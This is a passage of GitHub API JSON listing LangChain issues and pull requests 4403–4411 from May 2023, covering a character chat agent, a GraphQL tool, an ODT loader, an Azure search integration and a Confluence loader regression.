        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4411",
        "id": 1702448607,
        "node_id": "PR_kwDOIPDwls5QHads",
        "number": 4411,
        "title": "Adding a Character Chat Agent",
        "user": {
            "login": "treppers",
            "id": 90061012,
            "node_id": "MDQ6VXNlcjkwMDYxMDEy",
            "avatar_url": "https://avatars.githubusercontent.com/u/90061012?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/treppers",
            "html_url": "https://github.com/treppers",
            "followers_url": "https://api.github.com/users/treppers/followers",
            "following_url": "https://api.github.com/users/treppers/following{/other_user}",
            "gists_url": "https://api.github.com/users/treppers/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/treppers/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/treppers/subscriptions",
            "organizations_url": "https://api.github.com/users/treppers/orgs",
            "repos_url": "https://api.github.com/users/treppers/repos",
            "events_url": "https://api.github.com/users/treppers/events{/privacy}",
            "received_events_url": "https://api.github.com/users/treppers/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 4899412369,
                "node_id": "LA_kwDOIPDwls8AAAABJAcZkQ",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/area:%20agent",
                "name": "area: agent",
                "color": "BFD4F2",
                "default": false,
                "description": "Related to agents module"
            },
            {
                "id": 5680700863,
                "node_id": "LA_kwDOIPDwls8AAAABUpidvw",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:enhancement",
                "name": "auto:enhancement",
                "color": "C2E0C6",
                "default": false,
                "description": "A large net-new component, integration, or chain. Use sparingly. The largest features"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": {
            "login": "hinthornw",
            "id": 13333726,
            "node_id": "MDQ6VXNlcjEzMzMzNzI2",
            "avatar_url": "https://avatars.githubusercontent.com/u/13333726?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hinthornw",
            "html_url": "https://github.com/hinthornw",
            "followers_url": "https://api.github.com/users/hinthornw/followers",
            "following_url": "https://api.github.com/users/hinthornw/following{/other_user}",
            "gists_url": "https://api.github.com/users/hinthornw/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hinthornw/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hinthornw/subscriptions",
            "organizations_url": "https://api.github.com/users/hinthornw/orgs",
            "repos_url": "https://api.github.com/users/hinthornw/repos",
            "events_url": "https://api.github.com/users/hinthornw/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hinthornw/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "hinthornw",
                "id": 13333726,
                "node_id": "MDQ6VXNlcjEzMzMzNzI2",
                "avatar_url": "https://avatars.githubusercontent.com/u/13333726?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/hinthornw",
                "html_url": "https://github.com/hinthornw",
                "followers_url": "https://api.github.com/users/hinthornw/followers",
                "following_url": "https://api.github.com/users/hinthornw/following{/other_user}",
                "gists_url": "https://api.github.com/users/hinthornw/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/hinthornw/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/hinthornw/subscriptions",
                "organizations_url": "https://api.github.com/users/hinthornw/orgs",
                "repos_url": "https://api.github.com/users/hinthornw/repos",
                "events_url": "https://api.github.com/users/hinthornw/events{/privacy}",
                "received_events_url": "https://api.github.com/users/hinthornw/received_events",
                "type": "User",
                "site_admin": false
            },
            {
                "login": "baskaryan",
                "id": 22008038,
                "node_id": "MDQ6VXNlcjIyMDA4MDM4",
                "avatar_url": "https://avatars.githubusercontent.com/u/22008038?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/baskaryan",
                "html_url": "https://github.com/baskaryan",
                "followers_url": "https://api.github.com/users/baskaryan/followers",
                "following_url": "https://api.github.com/users/baskaryan/following{/other_user}",
                "gists_url": "https://api.github.com/users/baskaryan/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/baskaryan/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/baskaryan/subscriptions",
                "organizations_url": "https://api.github.com/users/baskaryan/orgs",
                "repos_url": "https://api.github.com/users/baskaryan/repos",
                "events_url": "https://api.github.com/users/baskaryan/events{/privacy}",
                "received_events_url": "https://api.github.com/users/baskaryan/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-09T17:30:58Z",
        "updated_at": "2023-11-07T19:52:16Z",
        "closed_at": "2023-11-07T19:52:16Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4411",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4411",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4411.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4411.patch",
            "merged_at": null
        },
        "body": "# Character Chat Agent\r\n\r\nFork of the conversational chat agent, but added in the concept of personality and fixed some issues I was getting with the output_parser.  You can provide a {character_summary} that will give your bot that personality.\r\n\r\nI was noticing some occasional weird responses with the conversation_chat agent so rewrote the entire prompt which seemed to have fixed some of them.  Also noticed some errors with output_parser (but will submit that as a separate PR).\r\n\r\nChanges with the prompt:\r\n\r\n- Moving all the TOOLS and FORMAT INSTRUCTIONS into the first System Message. \r\n- Keeping the actual Human Message to include the original input message.\r\n- Introduce a third voice called TOOL, that only speaks via the System Message\r\n- Created a More Instructions section instead of User Input to try to trigger the Final Answer\r\n- Also made sure to remove most of the you's and i's and replace it with nouns (Assistant, Human, TOOL)\r\n\r\nOutput_parser changes:\r\n- The agent sometimes doesn't want to respond with ````json` but instead will just say ````` which breaks the split function.\r\n- The agent sometimes doesn't doesn't want to follow the instructions and doesn't respond with any markdown (this is usually when the prompt contains enough information to do the completion).  To fix this I put a try-except to catch the when JSON fails.\r\n- The agent sometimes runs out of token and doesn't close the markdown snippet.  Created a case to handle this case.\r\n\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n@hwchase17",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4411/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4410",
        "id": 1702444254,
        "node_id": "PR_kwDOIPDwls5QHZjR",
        "number": 4410,
        "title": "Add workflow for testing with all deps",
        "user": {
            "login": "eyurtsev",
            "id": 3205522,
            "node_id": "MDQ6VXNlcjMyMDU1MjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3205522?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eyurtsev",
            "html_url": "https://github.com/eyurtsev",
            "followers_url": "https://api.github.com/users/eyurtsev/followers",
            "following_url": "https://api.github.com/users/eyurtsev/following{/other_user}",
            "gists_url": "https://api.github.com/users/eyurtsev/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eyurtsev/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eyurtsev/subscriptions",
            "organizations_url": "https://api.github.com/users/eyurtsev/orgs",
            "repos_url": "https://api.github.com/users/eyurtsev/repos",
            "events_url": "https://api.github.com/users/eyurtsev/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eyurtsev/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-09T17:27:30Z",
        "updated_at": "2023-05-11T14:58:03Z",
        "closed_at": "2023-05-10T13:35:07Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4410",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4410",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4410.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4410.patch",
            "merged_at": "2023-05-10T13:35:07Z"
        },
        "body": "# Add action to test with all dependencies installed\r\n\r\nPR adds a custom action for setting up poetry that allows specifying a cache key: https://github.com/actions/setup-python/issues/505#issuecomment-1273013236\r\n\r\nThis makes it possible to run 2 types of unit tests: \r\n\r\n(1) unit tests with only core dependencies\r\n(2) unit tests with extended dependencies (e.g., those that rely on an optional pdf parsing library)\r\n\r\n\r\nAs part of this PR, we're moving some pdf parsing tests into the unit-tests section and making sure that these unit tests get executed when running with extended dependencies.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4410/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4409",
        "id": 1702307883,
        "node_id": "PR_kwDOIPDwls5QG8FU",
        "number": 4409,
        "title": "[Feature] Add GraphQL Query Tool",
        "user": {
            "login": "O-Roma",
            "id": 28208564,
            "node_id": "MDQ6VXNlcjI4MjA4NTY0",
            "avatar_url": "https://avatars.githubusercontent.com/u/28208564?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/O-Roma",
            "html_url": "https://github.com/O-Roma",
            "followers_url": "https://api.github.com/users/O-Roma/followers",
            "following_url": "https://api.github.com/users/O-Roma/following{/other_user}",
            "gists_url": "https://api.github.com/users/O-Roma/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/O-Roma/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/O-Roma/subscriptions",
            "organizations_url": "https://api.github.com/users/O-Roma/orgs",
            "repos_url": "https://api.github.com/users/O-Roma/repos",
            "events_url": "https://api.github.com/users/O-Roma/events{/privacy}",
            "received_events_url": "https://api.github.com/users/O-Roma/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T15:50:42Z",
        "updated_at": "2023-05-17T08:22:05Z",
        "closed_at": "2023-05-15T21:06:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4409",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4409",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4409.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4409.patch",
            "merged_at": "2023-05-15T21:06:12Z"
        },
        "body": "# Add GraphQL Query Support\r\n\r\nThis PR introduces a GraphQL API Wrapper tool that allows LLM agents to query GraphQL databases. The tool utilizes the httpx and gql Python packages to interact with GraphQL APIs and provides a simple interface for running queries with LLM agents.\r\n\r\n@vowelparrot",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4409/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4408",
        "id": 1702283075,
        "node_id": "PR_kwDOIPDwls5QG22_",
        "number": 4408,
        "title": "fix: remove unnecessary line of code",
        "user": {
            "login": "mbchang",
            "id": 6439365,
            "node_id": "MDQ6VXNlcjY0MzkzNjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6439365?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mbchang",
            "html_url": "https://github.com/mbchang",
            "followers_url": "https://api.github.com/users/mbchang/followers",
            "following_url": "https://api.github.com/users/mbchang/following{/other_user}",
            "gists_url": "https://api.github.com/users/mbchang/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mbchang/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mbchang/subscriptions",
            "organizations_url": "https://api.github.com/users/mbchang/orgs",
            "repos_url": "https://api.github.com/users/mbchang/repos",
            "events_url": "https://api.github.com/users/mbchang/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mbchang/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T15:34:29Z",
        "updated_at": "2023-05-09T17:35:09Z",
        "closed_at": "2023-05-09T17:35:09Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4408",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4408",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4408.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4408.patch",
            "merged_at": "2023-05-09T17:35:09Z"
        },
        "body": "# Removes unnecessary line of code in https://python.langchain.com/en/latest/use_cases/agent_simulations/two_agent_debate_tools.html\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n## Who can review?\r\n\r\n@dev2049 \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4408/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4407",
        "id": 1702282488,
        "node_id": "I_kwDOIPDwls5ldsT4",
        "number": 4407,
        "title": "Regression: ConfluenceDataloader strips away Markdown formatting",
        "user": {
            "login": "adumont",
            "id": 333274,
            "node_id": "MDQ6VXNlcjMzMzI3NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/333274?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/adumont",
            "html_url": "https://github.com/adumont",
            "followers_url": "https://api.github.com/users/adumont/followers",
            "following_url": "https://api.github.com/users/adumont/following{/other_user}",
            "gists_url": "https://api.github.com/users/adumont/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/adumont/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/adumont/subscriptions",
            "organizations_url": "https://api.github.com/users/adumont/orgs",
            "repos_url": "https://api.github.com/users/adumont/repos",
            "events_url": "https://api.github.com/users/adumont/events{/privacy}",
            "received_events_url": "https://api.github.com/users/adumont/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T15:34:06Z",
        "updated_at": "2023-08-29T06:29:37Z",
        "closed_at": "2023-08-29T06:29:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\nAppears in LangChain 0.0.150\r\n\r\n### Who can help?\r\n\r\n@eyurtsev @vowelparrot\r\n\r\n### Information\r\n\r\n- [x] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [ ] LLMs/Chat Models\r\n- [ ] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [X] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\nDocuments extraccion (loading) from Confluence pages in version up to 0.0.149 would return Markdown pages. In our app we then use MarkdownTextSplitter to split and embedd.\r\n\r\nStarting with version 0.0.150, this behavior changed (Confluence beautifulsoup by @vowelparrot in #3576) and the documents extracted have lost their formatting.\r\n\r\nFormatting (especially combined with MarkdownTextSplitter ) helped the model in understanding the context (text structure, tables,...) and thus give better answer.\r\n\r\n### Expected behavior\r\n\r\nReturn Markdown pages as before, or alternatively provide a way to retrieve the documents either as Markdown (like up to version 0.0.149), or stripped (BeautifoulSoup'ed).\r\n\r\n(Markdown could be kept as an option, but it'd be nice not to remove it as I believe it helps the model (text structure, tables,...).",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407/reactions",
            "total_count": 6,
            "+1": 6,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4407/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4406",
        "id": 1702226183,
        "node_id": "PR_kwDOIPDwls5QGqdX",
        "number": 4406,
        "title": "Integration with Azure Cognitive Search",
        "user": {
            "login": "UmerHA",
            "id": 40663591,
            "node_id": "MDQ6VXNlcjQwNjYzNTkx",
            "avatar_url": "https://avatars.githubusercontent.com/u/40663591?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/UmerHA",
            "html_url": "https://github.com/UmerHA",
            "followers_url": "https://api.github.com/users/UmerHA/followers",
            "following_url": "https://api.github.com/users/UmerHA/following{/other_user}",
            "gists_url": "https://api.github.com/users/UmerHA/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/UmerHA/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/UmerHA/subscriptions",
            "organizations_url": "https://api.github.com/users/UmerHA/orgs",
            "repos_url": "https://api.github.com/users/UmerHA/repos",
            "events_url": "https://api.github.com/users/UmerHA/events{/privacy}",
            "received_events_url": "https://api.github.com/users/UmerHA/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T15:01:58Z",
        "updated_at": "2023-05-10T17:38:14Z",
        "closed_at": "2023-05-10T17:38:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4406",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4406",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4406.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4406.patch",
            "merged_at": "2023-05-10T17:38:14Z"
        },
        "body": "# Integration with Azure Cognitive Search\r\n\r\nAllows to use Azure Cognitive Search as retriever ( & thus solves enhancement issue #3317).\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n@hwchase17 @vowelparrot \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4406/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4405",
        "id": 1702223292,
        "node_id": "PR_kwDOIPDwls5QGp0o",
        "number": 4405,
        "title": "feat: add loader for open office odt files",
        "user": {
            "login": "MthwRobinson",
            "id": 1635179,
            "node_id": "MDQ6VXNlcjE2MzUxNzk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1635179?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/MthwRobinson",
            "html_url": "https://github.com/MthwRobinson",
            "followers_url": "https://api.github.com/users/MthwRobinson/followers",
            "following_url": "https://api.github.com/users/MthwRobinson/following{/other_user}",
            "gists_url": "https://api.github.com/users/MthwRobinson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/MthwRobinson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/MthwRobinson/subscriptions",
            "organizations_url": "https://api.github.com/users/MthwRobinson/orgs",
            "repos_url": "https://api.github.com/users/MthwRobinson/repos",
            "events_url": "https://api.github.com/users/MthwRobinson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/MthwRobinson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T15:00:28Z",
        "updated_at": "2023-05-10T08:37:18Z",
        "closed_at": "2023-05-10T08:37:17Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4405",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4405",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4405.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4405.patch",
            "merged_at": "2023-05-10T08:37:17Z"
        },
        "body": "# ODF File Loader\r\n\r\nAdds a data loader for handling Open Office ODT files. Requires `unstructured>=0.6.3`.\r\n\r\n### Testing\r\n\r\nThe following should work using the `fake.odt` example doc from the [`unstructured` repo](https://github.com/Unstructured-IO/unstructured).\r\n\r\n```python\r\nfrom langchain.document_loaders import UnstructuredODTLoader\r\n\r\nloader = UnstructuredODTLoader(file_path=\"fake.odt\", mode=\"elements\")\r\nloader.load()\r\n\r\nloader = UnstructuredODTLoader(file_path=\"fake.odt\", mode=\"single\")\r\nloader.load()\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4405/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4404",
        "id": 1702210282,
        "node_id": "I_kwDOIPDwls5ldarq",
        "number": 4404,
        "title": "Issue: <Model google/flan-t5-xxl does not exist>",
        "user": {
            "login": "phdykd",
            "id": 72084102,
            "node_id": "MDQ6VXNlcjcyMDg0MTAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/72084102?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/phdykd",
            "html_url": "https://github.com/phdykd",
            "followers_url": "https://api.github.com/users/phdykd/followers",
            "following_url": "https://api.github.com/users/phdykd/following{/other_user}",
            "gists_url": "https://api.github.com/users/phdykd/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/phdykd/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/phdykd/subscriptions",
            "organizations_url": "https://api.github.com/users/phdykd/orgs",
            "repos_url": "https://api.github.com/users/phdykd/repos",
            "events_url": "https://api.github.com/users/phdykd/events{/privacy}",
            "received_events_url": "https://api.github.com/users/phdykd/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T14:53:57Z",
        "updated_at": "2023-09-10T16:19:43Z",
        "closed_at": "2023-09-10T16:19:43Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Issue you'd like to raise.\n\nI have this code running smoothly before,\r\n\r\nllm=HuggingFaceHub(repo_id=\"google/flan-t5-xxl\", model_kwargs={\"temperature\":0.7, \"max_length\":512}).\r\n\r\nBu today, it says \"HfHubHTTPError: 404 Client Error: Not Found for url: https://huggingface.co/api/models/google/flan-t5-xxl (Request ID: Root=1-645a5b93-4a130f591edbbc965dc50e6b)\r\n\r\nSorry, we can't find the page you are looking for.\".\r\n\r\nAny idea?\r\n\n\n### Suggestion:\n\n_No response_",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4404/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4403",
        "id": 1702196541,
        "node_id": "PR_kwDOIPDwls5QGj-Y",
        "number": 4403,
        "title": "safely interrupt streaming requests",
        "user": {
            "login": "thehunmonkgroup",
            "id": 43772,
            "node_id": "MDQ6VXNlcjQzNzcy",
            "avatar_url": "https://avatars.githubusercontent.com/u/43772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/thehunmonkgroup",
            "html_url": "https://github.com/thehunmonkgroup",
            "followers_url": "https://api.github.com/users/thehunmonkgroup/followers",
            "following_url": "https://api.github.com/users/thehunmonkgroup/following{/other_user}",
            "gists_url": "https://api.github.com/users/thehunmonkgroup/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/thehunmonkgroup/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/thehunmonkgroup/subscriptions",
            "organizations_url": "https://api.github.com/users/thehunmonkgroup/orgs",
            "repos_url": "https://api.github.com/users/thehunmonkgroup/repos",
            "events_url": "https://api.github.com/users/thehunmonkgroup/events{/privacy}",
            "received_events_url": "https://api.github.com/users/thehunmonkgroup/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700873,
                "node_id": "LA_kwDOIPDwls8AAAABUpidyQ",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:improvement",
                "name": "auto:improvement",
                "color": "FBCA04",
                "default": false,
                "description": "Medium size change to existing code to handle new use-cases"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
